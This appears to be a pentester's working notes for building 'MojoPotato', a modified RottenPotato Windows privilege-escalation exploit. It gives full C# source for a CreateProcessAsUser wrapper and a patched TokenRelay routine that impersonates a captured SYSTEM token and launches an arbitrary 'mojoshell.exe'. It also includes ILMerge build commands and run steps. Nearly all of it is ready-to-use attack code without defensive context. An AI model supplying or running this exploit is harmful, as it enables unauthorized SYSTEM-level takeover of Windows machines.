whoami /all
SeImpersonatePriv == RottenPotato/Juciy
https://github.com/dotnet/ILMerge
https://decoder.cloud/2017/12/23/the-lonely-potato/
https://github.com/foxglovesec/RottenPotato.git



---------------------make new .cs class Call it MojoProcess.cs-------------

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Potato;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Potato
{
	class MojoProcess
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessID;
            public Int32 dwThreadID;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public Int32 Length;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("advapi32.dll",
         EntryPoint = "CreateProcessAsUser", SetLastError = true,
         CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)
        ]

        public static extern bool
         CreateProcessAsUser(IntPtr hToken,
        string lpApplicationName, string lpCommandLine,
              ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
              bool bInheritHandle, Int32 dwCreationFlags, IntPtr lpEnvrionment,
              string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
              ref PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern
        bool CloseHandle(IntPtr handle);


        public static bool RunMojoProcessAsUser(IntPtr hToken, String CmdLine)
        {

            MojoProcess.PROCESS_INFORMATION pi = new MojoProcess.PROCESS_INFORMATION();
            MojoProcess.SECURITY_ATTRIBUTES sa = new MojoProcess.SECURITY_ATTRIBUTES();
            MojoProcess.STARTUPINFO si = new MojoProcess.STARTUPINFO();
            try
            {
                sa.Length = Marshal.SizeOf(sa);
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = String.Empty;
                bool result = MojoProcess.CreateProcessAsUser(
                              hToken,
                              CmdLine,
                              String.Empty,
                              ref sa, ref sa,
                              false, 0, IntPtr.Zero,
                              @"C:\", ref si, ref pi
                              );

                if (!result)
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine(String.Format("RunMojoProcess Error: {0}", error));
                    return false;
                }
                Console.WriteLine("Executed:" + CmdLine);
                Process currentProcess = Process.GetCurrentProcess();
            }
            finally
            {
                if (pi.hProcess != IntPtr.Zero)
                    MojoProcess.CloseHandle(pi.hProcess);
                if (pi.hThread != IntPtr.Zero)
                    MojoProcess.CloseHandle(pi.hThread);
            }
            return true;
        }    }
}


-----------------------------------in _LocalToken.cs ---------------
       public void TokenRelay(BlockingCollection<byte[]> hashesIn, BlockingCollection<byte[]> hashesOut)
        {
            while (bContinueServer)
            {

                byte[] out_buffer = null;
                byte[] hash = hashesIn.Take();
                InitializeServer(hash, out out_buffer, out bContinueServer);
                hashesOut.Add(out_buffer);
                if (bContinueServer)
                {
                    hash = hashesIn.Take();
                    InitializeServer(hash, out out_buffer, out bContinueServer);

                    ImpersonateSecurityContext(ref _hServerContext);
                    // The above is just easier
                    //IntPtr hToken = IntPtr.Zero;
                    //MOJOCODE from here
                    mygetuser();
                    IntPtr hToken = IntPtr.Zero;
                    if (V.have_seimpersonate)
                    {
                        QuerySecurityContextToken(ref _hServerContext, out hToken);
                        ImpersonateLoggedOnUser(hToken);

                    }


                  
                   
                    
                    QuerySecurityContextToken(ref _hServerContext,out hToken);
                    String MojoCommand = "mojoshell.exe";
                    MojoProcess.RunMojoProcessAsUser(hToken,MojoCommand);

                    //MOJOCODE ends here


                    Console.WriteLine("BOOM!... Sleep: {0}msec", V.sleep_time);
                    Thread.Sleep(V.sleep_time);

                    hashesOut.Add(new byte[] { 99 }); // if finished pass 99
                }
            }
        }
    }
}

--------------------------------------------------------------------

.net v3.5

ILMerge.exe Potato.exe SharpCifs.dll NHttp.dll Microsoft.VisualStudio.OLE.Interop.dll  /targetplatform:2,"C:\Windows\Microsoft.Net\Framework\v2.0.50727" /out:MojoPotato.exe

or for .net v4  

ILMerge.exe Potato.exe SharpCifs.dll NHttp.dll Microsoft.VisualStudio.OLE.Interop.dll  /targetplatform:v4,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319" /out:MojoPotato.exe

copy MojoPotato.exe and mojoshell.exe into a folder together
C:\tmp>MojoPotato.exe 
this will call mojoshell.exe 